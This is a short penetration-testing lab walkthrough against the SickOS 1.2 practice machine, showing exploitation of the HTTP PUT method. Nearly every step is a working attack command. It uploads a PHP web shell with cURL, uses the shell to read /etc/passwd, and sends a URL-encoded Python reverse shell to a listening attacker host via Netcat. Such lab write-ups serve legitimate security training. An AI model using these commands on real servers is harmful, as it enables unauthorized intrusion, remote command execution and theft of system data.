# Scenarios: PUT/Upload

## Example 1:

Upon checking for HTTP methods available on the directory “test” using cURL, it was found that it can be potentially vulnerable to HTTP PUT method exploit.
```
curl -v -X OPTIONS http://192.168.216.128/test
```


Learning this, SickOS 1.2 was tested if it was possible to create a simple backdoor web shell using the HTTP PUT method exploit.
```

curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.216.128/test/shell.php
```

The result shows that SickOS 1.2 was indeed vulnerable to HTTP PUT method exploit.

Browsing to the test directory showed that the webshell was successfully created.
```
http://192.168.216.128/test
```
The webshell was then tested if it was properly working by reading the “/etc/passwd” file of SickOS 1.2.

Seeing the contents of “/etc/passwd/” file proves that the web shell was indeed working.
```
http://192.168.216.128/test/shell.php?cmd=cat%20/etc/passwd

```
The webshell was then used to run a reverse shell Python command while a Netcat was opened to listen for incoming connections. This resulted on gaining a shell with low privilege access.
```
nc -nlvp 443
```
```
http://192.168.216.128/test/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28socket.AF_INET,socket.SOCK_STREAM%29;s.connect%28%28%22192.168.216.129%22,443%29%29;os.dup2%28s.fileno%28%29,0%29;%20os.dup2%28s.fileno%28%29,1%29;%20os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29;%27
```
